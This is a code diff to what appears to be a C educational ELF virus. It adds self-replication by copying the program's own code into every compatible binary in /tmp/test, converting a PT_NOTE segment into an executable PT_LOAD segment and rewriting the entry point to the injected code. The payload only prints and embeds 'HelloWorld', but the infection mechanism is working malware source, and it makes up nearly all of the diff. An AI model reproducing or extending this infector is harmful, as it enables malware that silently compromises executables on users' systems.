@@ -1,3 +1,4 @@
+void  start() {}
 #define _FCNTL_H
 #include <linux/stat.h>
 #include <stddef.h>
@@ -20,6 +21,9 @@ struct  linux_dirent {
   unsigned short  d_reclen;
   char            d_name[];
 };
+
+void  end(void);
+int   entry_point(void);
 
 static int  write(int fd, const void *buf, size_t count) {
   register int8_t     rax asm("rax") = 1;
@@ -264,16 +268,54 @@ Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
 
 char payload[] = "HelloWorld";
 
-static int  appendSignature(struct bfile file, size_t offset) {
+static void  appendSignature(struct bfile file, size_t offset) {
   size_t  toAdd;
 
   toAdd = strlen(payload) + 1;
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
   memcpy(((void *)file.header) + offset, payload, toAdd);
+}
+
+static int  appendShellcode(struct bfile *bin) {
+  struct bfile  new;
+  size_t  size;
+
+  size = end - start;
+  new.size = bin->size + size;
+  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+    return (-1);
+  memcpy(new.header, bin->header, bin->size);
+  /* memset(((void *)new.header) + bin->size, 0xcc, 1); */
+  memcpy(((void *)new.header) + bin->size, start, size);
+  munmap(bin->header, bin->size);
+  bin->header = new.header;
+  bin->size = new.size;
   return (0);
 }
 
-static void  infectFile(struct bfile bin) {
+static int  appendCode(struct bfile *bin) {
+  size_t      size;
+  Elf64_Phdr  *segment;
+
+  if (appendShellcode(bin) == -1)
+    return (-1);
+  size = end - start;
+  segment = ((void *)bin->header) + bin->header->e_phoff;
+  while (segment->p_type != PT_NOTE)
+    segment += 1;
+  segment->p_flags = PF_R | PF_X;
+  segment->p_type = PT_LOAD;
+  segment->p_offset = bin->size - size;
+  segment->p_vaddr = 0xc000000 + bin->size - size;
+  segment->p_paddr = bin->size - size;
+  segment->p_filesz = size;
+  segment->p_memsz = size;
+  bin->header->e_entry = 0xc000000 + bin->size - ((void *)end - (void *)entry_point);
+  return (0);
+  
+}
+
+static int  infectFile(struct bfile bin) {
   size_t      len;
   Elf64_Shdr  *data;
   Elf64_Off   offset;
@@ -285,6 +327,8 @@ static void  infectFile(struct bfile bin) {
   appendSignature(bin, offset + data->sh_size - (len + 1));
   bin.size += len + 1;
   updateOffsets(bin.header, offset + data->sh_size - len - 1, len + 1);
+  if (appendCode(&bin) == -1)
+    return (-1);
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
@@ -310,6 +354,9 @@ static int  infectBins(const char *dirname) {
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
+  char  hello[] = "HelloWorld\n";
+  write(1, hello, 11);
+  // TODO Dirs with size > BUF_SIZE
   if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
     return (-1);
   bpos = 0;
@@ -320,16 +367,17 @@ static int  infectBins(const char *dirname) {
     if (ret == 0 &&
       bin.size >= sizeof(Elf64_Ehdr) &&
       isCompatible(bin.header->e_ident, bin.header->e_machine))
-      infectFile(bin);
+      if (infectFile(bin) == -1)
+        return (-1);
     bpos += dirp->d_reclen;
   }
   close(fd);
   return (0);
 }
 
-int   main(void) {
+int   entry_point(void) {
   size_t  i;
-  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
+  char    *infectDir[3] = {"/tmp/test", NULL};
 
   i = 0;
   while (infectDir[i] != NULL) {
@@ -339,3 +387,4 @@ int   main(void) {
   }
   return (0);
 }
+void  end() {}
